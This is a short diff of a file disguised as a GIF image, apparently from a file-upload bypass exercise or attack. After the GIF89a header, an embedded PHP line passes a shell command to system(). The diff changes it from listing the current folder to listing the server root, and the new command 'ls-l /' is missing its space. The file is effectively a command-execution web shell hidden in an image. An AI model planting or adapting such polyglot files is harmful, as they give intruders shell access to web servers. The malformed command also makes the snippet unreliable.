@@ -1,3 +1,3 @@
 GIF89a; 
-<?php system('ls'); ?>
+<?php system('ls-l /'); ?>
 
